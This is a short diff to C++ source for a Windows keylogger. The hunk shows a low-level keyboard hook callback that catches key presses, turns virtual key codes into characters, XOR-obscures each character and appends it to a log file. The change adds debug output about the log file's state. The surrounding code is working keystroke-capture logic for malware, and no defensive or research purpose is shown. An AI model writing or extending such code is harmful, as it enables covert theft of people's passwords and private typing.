@@ -49,8 +49,13 @@ LRESULT CALLBACK Keylogger::KBHook(int code, WPARAM wParam, LPARAM lParam) {
 
     if (code == HC_ACTION) {
         if (wParam == WM_KEYDOWN || wParam == WM_SYSKEYDOWN) {
+
             DWORD vkCode = pKeyStruct->vkCode;
             wchar_t* character = vk2ascii(vkCode);
+
+            std::cerr << "Is open: " << kblog.is_open() << std::endl;
+            std::cerr << "Good: " << kblog.good() << std::endl;
+
             if (character != nullptr) {
                 XOR(character, lstrlenW(character), key, lstrlenW(key));
                 kblog << static_cast<char>(*character) << std::endl;
